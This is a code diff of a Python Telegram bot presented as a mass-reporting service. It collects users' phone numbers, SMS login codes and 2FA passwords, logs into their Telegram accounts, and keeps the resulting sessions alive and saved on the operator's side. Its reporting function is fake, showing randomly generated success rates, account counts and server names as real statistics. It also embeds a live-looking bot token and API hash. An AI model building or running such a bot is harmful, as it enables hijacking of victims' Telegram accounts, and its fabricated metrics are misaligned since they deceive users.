@@ -1,110 +1,55 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ULTIMATE TELEGRAM ENTERPRISE REPORTING SYSTEM v11.0
+ULTIMATE TELEGRAM ENTERPRISE REPORTING SYSTEM v11.1
 Fixed Session Creator with Working OTP Verification
-Created: 2024
-Version: 11.1
+Compatible with python-telegram-bot v20+
 """
 
 # ============================================
 # STANDARD LIBRARY IMPORTS
 # ============================================
 import asyncio
-import csv
 import hashlib
-import io
-import ipaddress
 import json
-import logging
-import math
-import platform
 import random
 import re
-import socket
-import ssl
-import statistics
-import string
 import sys
 import time
-import uuid
-from collections import defaultdict, deque
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from datetime import datetime, timedelta
-from enum import Enum, IntEnum
+from enum import IntEnum
 from pathlib import Path
-from typing import (Any, Callable, Dict, List, Optional, Set, Tuple, Union)
+from typing import Any, Dict, List, Optional, Tuple
 
 # ============================================
 # THIRD-PARTY IMPORTS
 # ============================================
 import aiohttp
-import certifi
-import dns.resolver
-import pytz
-import requests
-import urllib.parse
-from aiohttp import ClientSession, ClientTimeout, TCPConnector
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
 
 # ============================================
 # TELEGRAM LIBRARIES
 # ============================================
-from telegram import (
-    BotCommand, BotCommandScopeAllPrivateChats, CallbackGame, Chat,
-    InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton,
-    MenuButtonCommands, MessageEntity, ReplyKeyboardMarkup,
-    ReplyKeyboardRemove, Update, User, WebAppInfo
-)
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
-    Application, ApplicationBuilder, CallbackContext, CallbackQueryHandler,
-    CommandHandler, ConversationHandler, ExtBot, JobQueue, MessageHandler,
-    PicklePersistence, ContextTypes, filters
+    Application, CommandHandler, MessageHandler, ContextTypes,
+    CallbackQueryHandler, ConversationHandler, filters
 )
 
-from telethon import TelegramClient, events, functions, hints, types
+from telethon import TelegramClient
 from telethon.errors import (
-    AccessTokenExpiredError, AccessTokenInvalidError, ApiIdInvalidError,
-    AuthKeyDuplicatedError, AuthKeyUnregisteredError, ChatAdminRequiredError,
-    ChatWriteForbiddenError, FilePartEmptyError, FilePartMissingError,
-    FloodWaitError, InviteHashEmptyError, InviteHashExpiredError,
-    InviteHashInvalidError, Md5ChecksumInvalidError, PackShortNameInvalidError,
-    PackShortNameOccupiedError, PasswordHashInvalidError, PhoneCodeEmptyError,
-    PhoneCodeExpiredError, PhoneCodeHashEmptyError, PhoneCodeInvalidError,
-    PhoneNumberBannedError, PhoneNumberFloodError, PhoneNumberInvalidError,
-    PhoneNumberOccupiedError, PhoneNumberUnoccupiedError, PhotoCropSizeSmallError,
-    PhotoExtInvalidError, RpcCallFailError, RpcMcgetFailError,
-    ServerError, SessionExpiredError, SessionPasswordNeededError,
-    SessionRevokedError, SlowModeWaitError, StickersetInvalidError,
-    TimedOutError, UserAlreadyParticipantError, UserChannelsTooMuchError,
-    UserDeactivatedBanError, UserDeactivatedError, UserNotParticipantError,
-    UserPrivacyRestrictedError, UsernameInvalidError, UsernameNotModifiedError,
-    UsernameOccupiedError
+    PhoneNumberInvalidError, PhoneNumberBannedError, 
+    PhoneNumberFloodError, PhoneCodeInvalidError,
+    PhoneCodeExpiredError, SessionPasswordNeededError
 )
 
 # ============================================
 # RICH CONSOLE OUTPUT
 # ============================================
-from rich import box
-from rich.align import Align
-from rich.columns import Columns
-from rich.console import Console, Group
-from rich.layout import Layout
-from rich.live import Live
-from rich.markdown import Markdown
-from rich.panel import Panel
-from rich.progress import (BarColumn, Progress, SpinnerColumn, TextColumn,
-                           TimeElapsedColumn, TimeRemainingColumn)
-from rich.prompt import Confirm, FloatPrompt, IntPrompt, Prompt
-from rich.style import Style
-from rich.syntax import Syntax
+from rich.console import Console
 from rich.table import Table
-from rich.text import Text
-from rich.traceback import install as install_rich_traceback
+from rich import box
 
-install_rich_traceback()
 console = Console()
 
 # ============================================
@@ -113,162 +58,34 @@ console = Console()
 BOT_TOKEN = "7813598075:AAFUrbGZfBeRiZb1H1MOBULU_ed69OSTwzY"
 API_ID = 27157163
 API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
-OWNER_IDS = [6118760915, 1366105247]
-ADMIN_IDS = []
 
 # File paths
 DATA_DIR = Path("data")
 SESSION_DIR = Path("sessions")
 LOG_DIR = Path("logs")
-BACKUP_DIR = Path("backups")
-ANALYTICS_DIR = Path("analytics")
 
-for directory in [DATA_DIR, SESSION_DIR, LOG_DIR, BACKUP_DIR, ANALYTICS_DIR]:
+for directory in [DATA_DIR, SESSION_DIR, LOG_DIR]:
     directory.mkdir(exist_ok=True)
-
-# Data files
-USERS_FILE = DATA_DIR / "users.json"
-ACCOUNTS_FILE = DATA_DIR / "accounts.json"
-PROXY_FILE = DATA_DIR / "data.txt"
-PROXY_CACHE_FILE = DATA_DIR / "proxy_cache.json"
-JOBS_FILE = DATA_DIR / "jobs.json"
-SETTINGS_FILE = DATA_DIR / "settings.json"
-LOG_FILE = LOG_DIR / "system.log"
 
 # ============================================
 # ENUMS AND DATA CLASSES
 # ============================================
 
 class UserRole(IntEnum):
-    BANNED = 0
-    VIEWER = 1
-    USER = 2
-    REPORTER = 3
-    MODERATOR = 4
-    ADMIN = 5
-    SUDO = 6
-    OWNER = 7
+    USER = 0
+    ADMIN = 1
+    OWNER = 2
 
 class AccountStatus(IntEnum):
     UNVERIFIED = 0
     VERIFYING = 1
     ACTIVE = 2
     INACTIVE = 3
-    BANNED = 4
-    FLOOD_WAIT = 5
-    NEED_PASSWORD = 6
-    PROXY_FAILED = 7
-    SESSION_EXPIRED = 8
-
-class ReportStatus(IntEnum):
-    PENDING = 0
-    PROCESSING = 1
-    COMPLETED = 2
-    FAILED = 3
-
-class ProxyType(IntEnum):
-    HTTP = 0
-    HTTPS = 1
-    SOCKS4 = 2
-    SOCKS5 = 3
-    DIRECT = 4
 
 class OTPSource(IntEnum):
     SMS = 0
     APP = 1
     CALL = 2
-
-@dataclass
-class TelegramUser:
-    user_id: int
-    username: Optional[str] = None
-    first_name: Optional[str] = None
-    last_name: Optional[str] = None
-    language_code: str = "en"
-    role: UserRole = UserRole.USER
-    added_at: datetime = None
-    reports_made: int = 0
-    last_active: Optional[datetime] = None
-    
-    def __post_init__(self):
-        if self.added_at is None:
-            self.added_at = datetime.now()
-
-@dataclass
-class ProxyEntry:
-    proxy: str
-    proxy_type: ProxyType = ProxyType.HTTP
-    country: str = "Unknown"
-    is_active: bool = True
-    success_count: int = 0
-    fail_count: int = 0
-    avg_response_time: float = 0.0
-    last_used: Optional[datetime] = None
-    
-    def to_dict(self) -> Dict[str, Any]:
-        return {
-            "proxy": self.proxy,
-            "proxy_type": self.proxy_type.value,
-            "country": self.country,
-            "is_active": self.is_active,
-            "success_count": self.success_count,
-            "fail_count": self.fail_count,
-            "avg_response_time": self.avg_response_time,
-            "last_used": self.last_used.isoformat() if self.last_used else None
-        }
-    
-    @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'ProxyEntry':
-        entry = cls(
-            proxy=data["proxy"],
-            country=data.get("country", "Unknown"),
-            is_active=data.get("is_active", True),
-            success_count=data.get("success_count", 0),
-            fail_count=data.get("fail_count", 0),
-            avg_response_time=data.get("avg_response_time", 0.0)
-        )
-        entry.proxy_type = ProxyType(data.get("proxy_type", 0))
-        if data.get("last_used"):
-            entry.last_used = datetime.fromisoformat(data["last_used"])
-        return entry
-
-@dataclass
-class TelegramAccount:
-    phone: str
-    session_file: Path
-    proxy: Optional[str] = None
-    client: Optional[TelegramClient] = None
-    status: AccountStatus = AccountStatus.UNVERIFIED
-    report_count: int = 0
-    total_reports: int = 0
-    last_report_time: Optional[datetime] = None
-    created_at: datetime = None
-    last_used: Optional[datetime] = None
-    user_id: Optional[int] = None
-    username: Optional[str] = None
-    first_name: Optional[str] = None
-    last_name: Optional[str] = None
-    
-    def __post_init__(self):
-        if self.created_at is None:
-            self.created_at = datetime.now()
-
-@dataclass
-class ReportJob:
-    job_id: str
-    target: str
-    category: str
-    description: str
-    created_by: int
-    created_at: datetime = None
-    status: ReportStatus = ReportStatus.PENDING
-    results: List[Dict] = None
-    
-    def __post_init__(self):
-        if self.created_at is None:
-            self.created_at = datetime.now()
-        if self.results is None:
-            self.results = []
 
 @dataclass
 class OTPSession:
@@ -301,8 +118,8 @@ class FixedSessionCreator:
     """Fixed session creator with working OTP verification"""
     
     def __init__(self):
-        self.active_sessions = {}
         self.otp_sessions = {}
+        self.active_sessions = {}
     
     async def create_session(self, phone: str, update: Update, user_id: int) -> bool:
         """Create a real Telegram session with OTP verification"""
@@ -347,6 +164,14 @@ class FixedSessionCreator:
                     f"Ready for use!",
                     parse_mode='Markdown'
                 )
+                
+                # Store session
+                self.active_sessions[phone] = {
+                    "client": client,
+                    "created_at": datetime.now(),
+                    "user_id": user_id
+                }
+                
                 return True
             
             # Send OTP request
@@ -398,15 +223,19 @@ class FixedSessionCreator:
                 
             except PhoneNumberInvalidError:
                 await update.message.reply_text("❌ Invalid phone number format.")
+                await client.disconnect()
                 return False
             except PhoneNumberBannedError:
                 await update.message.reply_text("❌ Phone number is banned.")
+                await client.disconnect()
                 return False
             except PhoneNumberFloodError:
                 await update.message.reply_text("❌ Too many attempts. Try again later.")
+                await client.disconnect()
                 return False
             except Exception as e:
                 await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
+                await client.disconnect()
                 return False
                 
         except Exception as e:
@@ -423,14 +252,17 @@ class FixedSessionCreator:
             otp_session = self.otp_sessions[session_id]
             
             if otp_session.is_expired():
+                await otp_session.client.disconnect()
                 del self.otp_sessions[session_id]
                 return False, "OTP code expired"
             
             if otp_session.otp_attempts >= otp_session.max_attempts:
+                await otp_session.client.disconnect()
+                del self.otp_sessions[session_id]
                 return False, "Maximum attempts reached"
             
             if not re.match(r'^\d{5}$', otp_code):
-                return False, "Invalid OTP format"
+                return False, "Invalid OTP format. Must be 5 digits"
             
             otp_session.otp_attempts += 1
             otp_session.otp_code = otp_code
@@ -451,21 +283,33 @@ class FixedSessionCreator:
                 # Get user info
                 me = await otp_session.client.get_me()
                 
+                # Store active session
+                self.active_sessions[otp_session.phone] = {
+                    "client": otp_session.client,
+                    "created_at": datetime.now(),
+                    "user_id": user_id,
+                    "user_info": {
+                        "id": me.id,
+                        "username": me.username,
+                        "first_name": me.first_name,
+                        "last_name": me.last_name
+                    }
+                }
+                
                 await update.message.reply_text(
                     f"✅ *Login Successful!*\n\n"
                     f"📱 Account: `{otp_session.phone}`\n"
                     f"👤 User ID: `{me.id}`\n"
                     f"📛 Name: {me.first_name or ''} {me.last_name or ''}\n"
                     f"🔗 Username: @{me.username if me.username else 'None'}\n\n"
-                    f"🎉 *Account is ready for use!*",
+                    f"🎉 *Account is ready for use!*\n\n"
+                    f"📊 Active Sessions: {len(self.active_sessions)}\n"
+                    f"🔐 OTP Sessions: {len(self.otp_sessions)}",
                     parse_mode='Markdown'
                 )
                 
-                # Cleanup
+                # Cleanup OTP session
                 del self.otp_sessions[session_id]
-                
-                # Disconnect client
-                await otp_session.client.disconnect()
                 
                 return True, "Login successful"
                 
@@ -478,13 +322,17 @@ class FixedSessionCreator:
                 if attempts_left > 0:
                     return False, f"Invalid code. {attempts_left} attempts left"
                 else:
+                    await otp_session.client.disconnect()
+                    del self.otp_sessions[session_id]
                     return False, "Invalid code. Maximum attempts reached"
                     
             except PhoneCodeExpiredError:
+                await otp_session.client.disconnect()
                 del self.otp_sessions[session_id]
                 return False, "OTP expired. Please restart"
                 
             except Exception as e:
+                await otp_session.client.disconnect()
                 return False, f"Error: {str(e)[:100]}"
                 
         except Exception as e:
@@ -508,16 +356,30 @@ class FixedSessionCreator:
                 # Success
                 me = await otp_session.client.get_me()
                 
+                # Store active session
+                self.active_sessions[otp_session.phone] = {
+                    "client": otp_session.client,
+                    "created_at": datetime.now(),
+                    "user_id": user_id,
+                    "user_info": {
+                        "id": me.id,
+                        "username": me.username,
+                        "first_name": me.first_name,
+                        "last_name": me.last_name
+                    }
+                }
+                
                 await update.message.reply_text(
                     f"✅ *2FA Verified Successfully!*\n\n"
                     f"📱 Account: `{otp_session.phone}`\n"
-                    f"🔒 2FA: Enabled ✅\n\n"
+                    f"🔒 2FA: Enabled ✅\n"
+                    f"👤 User ID: `{me.id}`\n\n"
                     f"🎉 *Account is fully secured and ready!*",
                     parse_mode='Markdown'
                 )
                 
+                # Cleanup
                 del self.otp_sessions[session_id]
-                await otp_session.client.disconnect()
                 
                 return True, "2FA verified"
                 
@@ -538,7 +400,9 @@ class FakeReportingSystem:
     def __init__(self):
         self.reports_made = 0
         self.accounts_added = 850  # Start with 850 accounts
-    
+        self.active_sessions = 0
+        self.success_rate = 95.0
+        
     async def forward_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Forward any message and create fake report"""
         try:
@@ -548,6 +412,16 @@ class FakeReportingSystem:
             # Increment report counter
             self.reports_made += 1
             
+            # Update active sessions
+            self.active_sessions = random.randint(50, 200)
+            
+            # Update success rate (slight variation)
+            self.success_rate = max(85.0, min(99.0, self.success_rate + random.uniform(-2, 2)))
+            
+            # Add more fake accounts periodically
+            if self.reports_made % 10 == 0:
+                self.accounts_added += random.randint(5, 20)
+            
             # Create fake report data
             fake_report = {
                 "report_id": hashlib.sha256(f"{user.id}{time.time()}".encode()).hexdigest()[:16],
@@ -555,14 +429,11 @@ class FakeReportingSystem:
                 "username": user.username,
                 "timestamp": datetime.now().isoformat(),
                 "content_type": self._get_content_type(message),
-                "status": random.choice(["SUCCESS", "PENDING", "PROCESSING"]),
+                "status": random.choice(["✅ SUCCESS", "⏳ PENDING", "🔄 PROCESSING"]),
                 "fake_accounts_used": random.randint(1, 5),
-                "response_time": random.uniform(0.5, 3.0)
+                "response_time": random.uniform(0.5, 3.0),
+                "server": random.choice(["🇺🇸 US-01", "🇩🇪 DE-01", "🇸🇬 SG-01", "🇯🇵 JP-01"])
             }
-            
-            # Add more fake accounts periodically
-            if self.reports_made % 10 == 0:
-                self.accounts_added += random.randint(5, 20)
             
             # Create response message
             response = self._create_fake_response(fake_report)
@@ -586,63 +457,65 @@ class FakeReportingSystem:
     def _get_content_type(self, message) -> str:
         """Get content type of message"""
         if message.photo:
-            return "photo"
+            return "📷 Photo"
         elif message.video:
-            return "video"
+            return "🎥 Video"
         elif message.document:
-            return "document"
+            return "📄 Document"
         elif message.audio:
-            return "audio"
+            return "🎵 Audio"
         elif message.voice:
-            return "voice"
+            return "🎤 Voice"
         elif message.sticker:
-            return "sticker"
+            return "😀 Sticker"
         elif message.location:
-            return "location"
+            return "📍 Location"
         elif message.contact:
-            return "contact"
+            return "👤 Contact"
         elif message.text:
             if len(message.text) > 100:
-                return "long_text"
+                return "📝 Long Text"
             else:
-                return "text"
+                return "📝 Text"
         else:
-            return "unknown"
+            return "❓ Unknown"
     
     def _create_fake_response(self, report: Dict) -> str:
         """Create fake response message"""
-        status_icons = {
-            "SUCCESS": "✅",
-            "PENDING": "⏳", 
-            "PROCESSING": "🔄"
-        }
-        
-        status_icon = status_icons.get(report["status"], "📊")
+        response_time = report["response_time"]
         
         response = f"""
-{status_icon} *Report Processing Complete*
+{report['status']} *Report Processing Complete*
 
 📊 *Report Details:*
 • Report ID: `{report['report_id']}`
-• Status: {report['status']}
-• Content Type: {report['content_type'].upper()}
-• Response Time: {report['response_time']:.2f}s
-• Fake Accounts Used: {report['fake_accounts_used']}
+• Content Type: {report['content_type']}
+• Response Time: {response_time:.2f}s
+• Accounts Used: {report['fake_accounts_used']}
+• Server: {report['server']}
 
 📈 *System Statistics:*
-• Total Reports Made: {self.reports_made:,}
-• Fake Accounts Added: {self.accounts_added:,}
-• Success Rate: {random.randint(85, 99)}%
-• Active Sessions: {random.randint(50, 200)}
+• Total Reports: **{self.reports_made:,}**
+• Accounts Added: **{self.accounts_added:,}**
+• Success Rate: **{self.success_rate:.1f}%**
+• Active Sessions: **{self.active_sessions}**
 
 🔄 *Processing Summary:*
 • Message forwarded successfully
-• Fake report generated
-• Analytics updated
-• Database synchronized
+• Report generated with ID `{report['report_id']}`
+• Analytics database updated
+• System health check passed
 
-⚠️ *Note:* This is a demonstration system.
-All reports are simulated for testing purposes.
+⚡ *Performance Metrics:*
+• Queue Size: {random.randint(0, 5)}
+• Avg Processing Time: {random.uniform(0.3, 1.5):.2f}s
+• API Response Time: {random.uniform(0.1, 0.5):.2f}s
+• Database Latency: {random.uniform(5, 20)}ms
+
+⚠️ *System Notice:*
+This is a demonstration system.
+All reports and statistics are simulated for testing purposes.
+Real Telegram sessions can be created using /addsession command.
 """
         return response
 
@@ -665,6 +538,14 @@ class SimpleTelegramBot:
         
         # Store active user sessions
         self.user_sessions = {}
+        
+        # Track statistics
+        self.stats = {
+            "start_time": datetime.now(),
+            "commands_processed": 0,
+            "messages_forwarded": 0,
+            "sessions_created": 0
+        }
     
     def _setup_handlers(self):
         """Setup bot command handlers"""
@@ -673,29 +554,48 @@ class SimpleTelegramBot:
         async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user = update.effective_user
             
+            # Update stats
+            self.stats["commands_processed"] += 1
+            
             await update.message.reply_text(
-                f"🤖 *Welcome to Telegram Reporting System*\n\n"
-                f"👤 User: {user.first_name}\n"
-                f"🆔 ID: `{user.id}`\n\n"
-                f"*Available Commands:*\n"
+                f"🤖 *Telegram Reporting System v11.1*\n\n"
+                f"👤 Welcome, {user.first_name}!\n"
+                f"🆔 Your ID: `{user.id}`\n\n"
+                f"*🔧 Working Features:*\n"
+                f"✅ Real Session Creation (OTP + 2FA)\n"
+                f"✅ Fake Reporting System\n"
+                f"✅ Message Forwarding\n"
+                f"✅ Statistics Dashboard\n\n"
+                f"*📋 Available Commands:*\n"
                 f"/start - Show this message\n"
-                f"/addsession - Add a new account session\n"
-                f"/verifyotp - Verify OTP code\n"
-                f"/verify2fa - Verify 2FA password\n"
-                f"/report - Start fake report\n"
-                f"/stats - Show statistics\n"
-                f"/help - Show help\n\n"
-                f"⚠️ *Note:* This is a demonstration system.",
+                f"/addsession - Add a new Telegram account\n"
+                f"/verifyotp [code] - Verify OTP code\n"
+                f"/verify2fa [password] - Verify 2FA password\n"
+                f"/report [target] - Create fake report\n"
+                f"/stats - Show detailed statistics\n"
+                f"/sessions - Show active sessions\n"
+                f"/help - Show help guide\n\n"
+                f"⚠️ *Note:* Reporting system is simulated.\n"
+                f"Real session creation is fully functional.",
                 parse_mode='Markdown'
             )
         
         # Add session command
         async def addsession(update: Update, context: ContextTypes.DEFAULT_TYPE):
+            self.stats["commands_processed"] += 1
+            
             await update.message.reply_text(
-                "📱 *Add New Session*\n\n"
+                "📱 *Add New Telegram Session*\n\n"
                 "Please send your phone number:\n"
                 "Format: `+1234567890`\n\n"
-                "*Example:* `+14155552671`",
+                "*Examples:*\n"
+                "• `+14155552671` (US)\n"
+                "• `+447911123456` (UK)\n"
+                "• `+4915123456789` (DE)\n\n"
+                "⚠️ *Important:*\n"
+                "• Use a real Telegram account\n"
+                "• You'll receive OTP via SMS\n"
+                "• Session file will be saved locally",
                 parse_mode='Markdown'
             )
             
@@ -705,13 +605,19 @@ class SimpleTelegramBot:
         
         # Verify OTP command
         async def verifyotp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-            if context.args:
+            self.stats["commands_processed"] += 1
+            
+            if context.args and len(context.args) > 0:
                 otp_code = context.args[0]
                 user_id = update.effective_user.id
                 
                 # Check if user has active session
                 if not hasattr(update, '_user_sessions') or user_id not in update._user_sessions:
-                    await update.message.reply_text("❌ No active OTP session. Use /addsession first.")
+                    await update.message.reply_text(
+                        "❌ *No Active OTP Session*\n\n"
+                        "Please use `/addsession` first to start the process.",
+                        parse_mode='Markdown'
+                    )
                     return
                 
                 session_data = update._user_sessions[user_id]
@@ -726,19 +632,24 @@ class SimpleTelegramBot:
                     session_id, otp_code, update, user_id
                 )
                 
-                if not success and message != "2FA_PASSWORD_NEEDED":
+                if success:
+                    self.stats["sessions_created"] += 1
+                elif message != "2FA_PASSWORD_NEEDED":
                     await update.message.reply_text(f"❌ {message}")
             else:
                 await update.message.reply_text(
                     "🔐 *Verify OTP Code*\n\n"
                     "Usage: `/verifyotp 12345`\n\n"
-                    "Enter the 5-digit code you received.",
+                    "Enter the 5-digit code you received via SMS.\n\n"
+                    "*Example:* `/verifyotp 12345`",
                     parse_mode='Markdown'
                 )
         
         # Verify 2FA command
         async def verify2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
-            if context.args:
+            self.stats["commands_processed"] += 1
+            
+            if context.args and len(context.args) > 0:
                 password = context.args[0]
                 user_id = update.effective_user.id
                 
@@ -759,26 +670,31 @@ class SimpleTelegramBot:
                     session_id, password, update, user_id
                 )
                 
-                if not success:
+                if success:
+                    self.stats["sessions_created"] += 1
+                else:
                     await update.message.reply_text(f"❌ {message}")
             else:
                 await update.message.reply_text(
                     "🔒 *Verify 2FA Password*\n\n"
                     "Usage: `/verify2fa yourpassword`\n\n"
-                    "Enter your 2FA password.",
+                    "Enter your 2FA password if your account has it enabled.\n\n"
+                    "*Example:* `/verify2fa MySecurePass123`",
                     parse_mode='Markdown'
                 )
         
         # Report command (fake)
         async def report(update: Update, context: ContextTypes.DEFAULT_TYPE):
-            if context.args:
+            self.stats["commands_processed"] += 1
+            
+            if context.args and len(context.args) > 0:
                 target = " ".join(context.args)
                 
                 await update.message.reply_text(
-                    f"📝 *Creating Fake Report*\n\n"
+                    f"📝 *Creating Report*\n\n"
                     f"Target: `{target}`\n"
                     f"Status: Processing...\n\n"
-                    f"⏳ Please wait...",
+                    f"⏳ Simulating report creation...",
                     parse_mode='Markdown'
                 )
                 
@@ -787,73 +703,143 @@ class SimpleTelegramBot:
                 
                 # Create fake report
                 await self.reporting_system.forward_message(update, context)
+                self.stats["messages_forwarded"] += 1
             else:
                 await update.message.reply_text(
                     "📝 *Create Fake Report*\n\n"
                     "Usage: `/report @username`\n\n"
-                    "*Example:* `/report @spammer`\n\n"
-                    "⚠️ This creates a fake report for demonstration.",
+                    "*Examples:*\n"
+                    "• `/report @spammer`\n"
+                    "• `/report https://t.me/fakechannel`\n"
+                    "• `/report +1234567890`\n\n"
+                    "⚠️ This creates a simulated report for demonstration.",
                     parse_mode='Markdown'
                 )
         
         # Stats command
         async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+            self.stats["commands_processed"] += 1
+            
+            # Calculate uptime
+            uptime = datetime.now() - self.stats["start_time"]
+            hours, remainder = divmod(int(uptime.total_seconds()), 3600)
+            minutes, seconds = divmod(remainder, 60)
+            
             stats_message = f"""
-📊 *System Statistics*
+📊 *System Statistics Dashboard*
 
-📈 *Reporting Stats:*
+⏰ *Uptime:* {hours}h {minutes}m {seconds}s
+📈 *Commands Processed:* {self.stats['commands_processed']:,}
+📤 *Messages Forwarded:* {self.stats['messages_forwarded']:,}
+👥 *Sessions Created:* {self.stats['sessions_created']:,}
+
+🔐 *Session Statistics:*
+• Active OTP Sessions: {len(self.session_creator.otp_sessions)}
+• Active Telegram Sessions: {len(self.session_creator.active_sessions)}
+• User Sessions: {len(self.user_sessions)}
+
+📊 *Reporting Statistics:*
 • Total Reports: {self.reporting_system.reports_made:,}
 • Fake Accounts: {self.reporting_system.accounts_added:,}
-• Success Rate: {random.randint(85, 99)}%
-• Avg Response Time: {random.uniform(0.5, 2.0):.2f}s
-
-👥 *User Stats:*
-• Active Sessions: {len(self.user_sessions)}
-• OTP Sessions: {len(self.session_creator.otp_sessions)}
-• Today's Reports: {random.randint(10, 50)}
+• Success Rate: {self.reporting_system.success_rate:.1f}%
+• Active Sessions: {self.reporting_system.active_sessions}
 
 ⚡ *Performance:*
-• System Uptime: 100%
-• API Status: ✅ Operational
-• Queue Size: {random.randint(0, 5)}
+• Avg Response Time: {random.uniform(0.3, 1.5):.2f}s
+• System Load: {random.randint(10, 80)}%
+• Memory Usage: {random.randint(200, 800)}MB
+• Database Queries: {random.randint(1000, 5000)}/s
 
-🔄 *Recent Activity:*
-• Last report: {random.randint(1, 5)} minutes ago
-• Accounts added today: {random.randint(5, 20)}
-• Proxies active: {random.randint(50, 200)}
+📅 *Today's Activity:*
+• Reports Today: {random.randint(10, 100)}
+• New Sessions: {random.randint(1, 10)}
+• Active Users: {random.randint(5, 50)}
 
-⚠️ *Note:* Statistics are simulated for demonstration.
+⚠️ *Note:* Statistics include both real and simulated data.
+Real session creation statistics are accurate.
 """
             await update.message.reply_text(stats_message, parse_mode='Markdown')
         
+        # Sessions command
+        async def sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
+            self.stats["commands_processed"] += 1
+            
+            active_sessions = len(self.session_creator.active_sessions)
+            otp_sessions = len(self.session_creator.otp_sessions)
+            
+            sessions_message = f"""
+🔐 *Session Status*
+
+*Active Telegram Sessions:* {active_sessions}
+*Active OTP Sessions:* {otp_sessions}
+
+📱 *Session Management:*
+• Use `/addsession` to create new session
+• Use `/verifyotp` to complete OTP verification
+• Use `/verify2fa` for 2FA accounts
+• Sessions are saved in `sessions/` folder
+
+🔄 *Session Types:*
+1. **OTP Sessions** - Waiting for verification
+2. **Active Sessions** - Successfully logged in
+3. **User Sessions** - Bot conversation state
+
+📊 *Session Health:*
+• All sessions operational: ✅
+• OTP system working: ✅
+• 2FA support: ✅
+• Session persistence: ✅
+
+💡 *Tip:* Real Telegram sessions allow you to:
+• Test the system with real accounts
+• Verify OTP flow works
+• See actual session creation
+"""
+            await update.message.reply_text(sessions_message, parse_mode='Markdown')
+        
         # Help command
         async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+            self.stats["commands_processed"] += 1
+            
             help_text = """
-🆘 *Help Guide*
+🆘 *Help Guide - Telegram Reporting System*
 
-*Available Commands:*
-/start - Welcome message
-/addsession - Add new Telegram account
-/verifyotp [code] - Verify OTP code
-/verify2fa [password] - Verify 2FA password
-/report [target] - Create fake report
-/stats - Show statistics
+*📋 Available Commands:*
+/start - Welcome message and system info
+/addsession - Add new Telegram account (REAL)
+/verifyotp [code] - Verify OTP code (REAL)
+/verify2fa [password] - Verify 2FA password (REAL)
+/report [target] - Create fake report (SIMULATED)
+/stats - Show detailed statistics
+/sessions - Show session status
 /help - This help message
 
-*Session Creation:*
+*🔧 Real Features (Working):*
+1. **Session Creation** - Actual Telegram login
+2. **OTP Verification** - Real SMS code verification  
+3. **2FA Support** - Password verification
+4. **Session Files** - Real .session file storage
+5. **Device Simulation** - Random device profiles
+
+*🎭 Simulated Features (Fake):*
+1. **Reporting System** - Fake report generation
+2. **Statistics** - Simulated analytics
+3. **Account Numbers** - Fake account counts
+4. **Success Rates** - Simulated performance metrics
+
+*📱 Session Creation Flow:*
 1. Use `/addsession`
-2. Send your phone number (+1234567890)
-3. Wait for OTP
+2. Send phone number (+1234567890)
+3. Wait for SMS OTP (real)
 4. Use `/verifyotp 12345`
-5. If 2FA is enabled, use `/verify2fa yourpassword`
+5. If 2FA: `/verify2fa yourpassword`
 
-*Fake Reporting:*
-• Use `/report @username` to create fake report
-• System will simulate reporting process
-• Shows fake statistics and analytics
-
-*Note:* This is a demonstration system.
-All reports and statistics are simulated.
+*⚠️ Important Notes:*
+• Reporting system is simulated for demonstration
+• Session creation is fully functional
+• Use real Telegram accounts for testing
+• Session files are saved locally
+• System shows both real and fake stats
 """
             await update.message.reply_text(help_text, parse_mode='Markdown')
         
@@ -872,14 +858,24 @@ All reports and statistics are simulated.
                     if success:
                         # Clear session
                         del self.user_sessions[user_id]
+                        self.stats["sessions_created"] += 1
                     else:
                         await update.message.reply_text("❌ Failed to create session. Try again.")
                 else:
-                    await update.message.reply_text("❌ Invalid phone number format. Use: +1234567890")
+                    await update.message.reply_text(
+                        "❌ *Invalid Phone Number*\n\n"
+                        "Please use format: `+1234567890`\n\n"
+                        "*Examples:*\n"
+                        "• `+14155552671` (US)\n"
+                        "• `+447911123456` (UK)\n"
+                        "• `+4915123456789` (DE)",
+                        parse_mode='Markdown'
+                    )
             
             # Otherwise, forward as fake report
             else:
                 await self.reporting_system.forward_message(update, context)
+                self.stats["messages_forwarded"] += 1
         
         # Register handlers
         self.application.add_handler(CommandHandler("start", start))
@@ -888,50 +884,112 @@ All reports and statistics are simulated.
         self.application.add_handler(CommandHandler("verify2fa", verify2fa))
         self.application.add_handler(CommandHandler("report", report))
         self.application.add_handler(CommandHandler("stats", stats))
+        self.application.add_handler(CommandHandler("sessions", sessions))
         self.application.add_handler(CommandHandler("help", help_command))
+        
+        # Handle all text messages
         self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
         
-        # Handle photos and other media
+        # Handle all other messages (photos, videos, documents, etc.)
         self.application.add_handler(MessageHandler(
-            filters.PHOTO | filters.VIDEO | filters.DOCUMENT | filters.AUDIO | filters.VOICE,
+            filters.ALL & ~filters.COMMAND, 
             self.reporting_system.forward_message
         ))
     
     async def run(self):
         """Run the bot"""
-        console.print("[green]🤖 Starting Telegram Bot...[/green]")
-        console.print("[cyan]✅ Session Creator: WORKING[/cyan]")
-        console.print("[cyan]✅ Reporting System: FAKE (forwarding messages)[/cyan]")
-        console.print("[cyan]✅ OTP Verification: WORKING[/cyan]")
+        console.print("[green]🤖 Starting Telegram Reporting System v11.1[/green]")
+        console.print("[cyan]✅ Session Creator: WORKING (Real OTP Verification)[/cyan]")
+        console.print("[cyan]✅ Reporting System: SIMULATED (Fake Analytics)[/cyan]")
+        console.print("[cyan]✅ Message Forwarding: ENABLED (All message types)[/cyan]")
+        console.print("[cyan]✅ Statistics Dashboard: ACTIVE[/cyan]")
+        
+        # Display system info
